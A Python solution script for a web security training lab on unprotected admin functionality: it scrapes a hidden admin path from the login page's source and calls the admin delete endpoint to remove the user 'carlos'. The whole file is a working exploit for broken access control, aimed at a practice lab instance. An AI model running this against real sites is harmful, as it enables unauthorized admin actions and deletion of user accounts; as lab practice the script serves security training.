###########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 4/9/2023
#
# Lab: Unprotected admin functionality with unpredictable URL
#
# Steps: 1. Fetch the /login page
#        2. Extract the admin panel path from the source code
#        3. Fetch the admin panel
#        4. Delete carlos
#
###########################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this url to your lab
url = "https://0a2700ad04b28e7d8799eef000a80066.web-security-academy.net"

try:  # fetch /login page
    get_login = requests.get(f"{url}/login")
    if get_login.status_code == 200:
        print(Fore.WHITE + "1. Fetching /login page.. " + Fore.GREEN + "OK")

        # extract the hidden path
        admin_panel_path = re.findall("'(/admin-.*)'",
                                      get_login.text)[0]
        session = get_login.cookies.get("session")
        print(Fore.WHITE + "2. Extracting the admin panel path from the source code.. " + Fore.GREEN +
              "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_panel_path)

        # fetch admin panel
        # this step is not necessary in the script, you can do step 4 directrly
        # it's a must only when solving the lab using the browser
        try:
            cookies = {
                "session": session
            }
            admin_panel = requests.get(
                f"{url}{admin_panel_path}", cookies=cookies)
            if admin_panel.status_code == 200:
                print(
                    Fore.WHITE + "3. Fetching the admin panel.. " + Fore.GREEN + "OK")

                try:  # delete the carlos
                    delete_carlos = requests.get(
                        f"{url}{admin_panel_path}/delete?username=carlos", cookies=cookies)
                    if delete_carlos.status_code == 200:
                        print(
                            Fore.WHITE + "4. Deleting carlos.. " + Fore.GREEN + "OK")
                        print(
                            Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                    else:
                        print(Fore.RED + "[!] Failed to delete carlos")
                except:
                    print(
                        Fore.RED + "[!] Failed to delete carlos through exception")
            else:
                print(Fore.RED + "[!] Failed to fetch admin panel")
        except:
            print(
                Fore.RED + "[!] Failed to fetch admin panel through exception")
    else:
        print(Fore.RED + "[!] Failed to fetch /login")
except:
    print(Fore.RED + "[!] Failed to fetch /login through exception")
